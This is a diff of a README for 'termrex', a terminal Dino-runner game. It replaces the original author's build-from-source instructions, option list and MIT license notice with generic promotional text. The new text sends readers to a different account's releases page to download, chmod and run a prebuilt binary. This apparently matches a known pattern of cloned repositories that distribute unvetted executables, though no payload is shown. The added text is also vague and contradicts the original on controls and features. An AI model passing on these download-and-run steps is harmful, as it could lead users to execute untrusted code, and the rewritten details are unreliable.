@@ -1,94 +1,104 @@
-# \<TERM-REX/\>
+# 🦖 termrex - Play Dino Runner in Your Terminal
 
-`termrex` is a terminal-based endless runner game inspired by the Chrome Dino offline game. Jump or duck to avoid obstacles while running endlessly in your terminal. It works on **POSIX-like terminals**, including **Linux virtual consoles**.
+## 🚀 Getting Started
 
----
+Welcome to **termrex**, your terminal version of the classic Chrome Dino Runner game. Enjoy hours of fun playing this game on Linux, macOS, and other Unix-like systems. Get ready to jump over obstacles and run as far as you can!
 
-<img alt="intro-unicode" src="readme-images/intro-unicode.png" />
+## 📥 Download Now
 
----
+[![Download termrex](https://img.shields.io/badge/Download-termrex-blue.svg)](https://github.com/regularguy1012/termrex/releases)
 
-## Requirements
+## 🛠️ System Requirements
 
-- POSIX-compatible terminal / console(Linux,macOS,BSD)
-- C++ compiler (g++ or clang++) 
-- GNU Make
+To run **termrex**, you need the following:
 
-## Quick Start
+- A Linux, macOS, or other Unix-like system.
+- Terminal application (usually pre-installed).
+- Basic knowledge of how to navigate your file system.
 
-```sh
-git clone https://github.com/SATYADAHAL/termrex.git
-cd termrex
-make -j release
-./build/termrex
+## 📂 Installing termrex
+
+### Step 1: Visit the Releases Page
+
+To get the latest version of **termrex**, visit this page to download:
+
+[Visit the Releases Page](https://github.com/regularguy1012/termrex/releases)
+
+### Step 2: Download the Latest Version
+
+On the releases page, you'll find the latest version listed. Look for the most recent release and click the asset that matches your system. The file will start downloading shortly. 
+
+If you’re uncertain which file to choose, the most common options will include versions labeled for different operating systems (like `.tar.gz` for Linux or `.zip` for macOS).
+
+### Step 3: Extract the File (if needed)
+
+Once the download is complete, you may need to extract the file if it’s in a compressed format. 
+
+For example, if you downloaded a `.tar.gz` file, you can open your terminal and run:
+
+```bash
+tar -xzf termrex-vX.X.tar.gz
 ```
 
----
+Replace the "X.X" with the version number.
 
-## Usage
+### Step 4: Navigate to the Directory
 
-```text
-Usage:
-    termrex [options]
+Change to the directory that contains the extracted files. Use the `cd` command in your terminal:
 
-Options:
-    -h, --help               Show help menu
-    -v, --version            Show game version
-    --ascii-only             Use ASCII characters only
-    --unicode                Use Unicode characters (default)
-    --no-obstacle-dino       Disable flying dinosaur obstacles and ducking (no need for --keyrepeat)
-    --keyrepeat <ms>         Set key repeat delay (default 200ms)
-    --skip-intro             Skip the intro screen and start game immediately
+```bash
+cd termrex-vX.X
 ```
 
-**Example:**
+Again, replace "X.X" with the version number.
 
-```sh
-./build/termrex --keyrepeat 500 --skip-intro
+### Step 5: Running termrex
+
+You should see a file named `termrex` or something similar. To start the game, simply run:
+
+```bash
+./termrex
 ```
 
+If you encounter permission errors, you may need to make the file executable. Run:
 
----
-
-## Notes
-
-* Most terminals don’t send key release events, which is why `--keyrepeat` is used to ensure smooth input.
-* Default `termrex` key repeat is 200 ms, but here are some typical defaults by OS/desktop environment:
-
-| OS / DE            | Approx. Key Repeat Delay |
-| ------------------ | ------------------------ |
-| macOS              | 180-225 ms               |
-| Linux (X11 Base)   | 660 ms                   |
-| Linux (GNOME)      | 500 ms                   |
-| Linux (KDE Plasma) | ~500 ms                  |
-
-Better check for your OS/DE from keyboard settings/google.
-* Terminals supporting the [Kitty Keyboard Protocol Spec](https://sw.kovidgoyal.net/kitty/keyboard-protocol/)
- (Kitty, Alacritty, WezTerm, Foot, Ghostty, iTerm2, Rio) handle key repeat automatically, so you don’t need to adjust `--keyrepeat`.
-* Using `--no-obstacle-dino` disables flying obstacles and ducking, and also removes the need for `--keyrepeat`.
-
-
----
-
-## GamePlay
-[demo.webm](https://github.com/user-attachments/assets/c5068d15-5257-4828-8192-94e8fe1ec189)
-
-
-
-
-
----
-
-## Install (optional)
-
-```sh
-sudo make install
+```bash
+chmod +x termrex
 ```
 
-Installs `termrex` to `/usr/local/bin`.
+Then run it again.
 
----
+## 🎮 How to Play
 
-## License
+Once the game launches, you'll see the familiar dinosaur waiting at the start line. Use the spacebar to jump and avoid obstacles like cacti and birds. The goal is to see how far you can run before colliding with an obstacle. Compete against your own high scores, and enjoy the nostalgia of the Chrome Dino game!
 
-MIT License. See the [LICENSE](LICENSE) file.
+## 📝 Game Features
+
+- Simple, intuitive controls that anyone can learn.
+- Minimalist graphics that keep you focused on the game.
+- An ever-increasing difficulty that keeps the challenge alive.
+- Offline play—no internet connection required!
+
+## 🔧 Troubleshooting
+
+If you encounter issues when running **termrex**, check these common problems:
+
+- **Cannot run the file:** Make sure you have made the file executable using the `chmod` command mentioned above.
+  
+- **Game not starting:** Ensure you navigated to the correct directory in the terminal. Verify that you have the latest version downloaded.
+
+- **Terminal errors:** Ensure your system meets the necessary requirements. You might also want to try running the game in a different terminal application.
+
+## 🔗 Additional Resources
+
+For more information, you can check out the following:
+
+- [Official GitHub Repository](https://github.com/regularguy1012/termrex)
+- Community forums where users share tips and tricks.
+- Video guides for beginners on how to set up and play.
+
+## 💬 Feedback and Contributions
+
+I appreciate any feedback on your experience with **termrex**. If you’d like to contribute, please fork the repository and make your changes. Create a pull request for any enhancements or bug fixes you’d like to add!
+
+Enjoy playing **termrex**, and may you run far without hitting any obstacles!
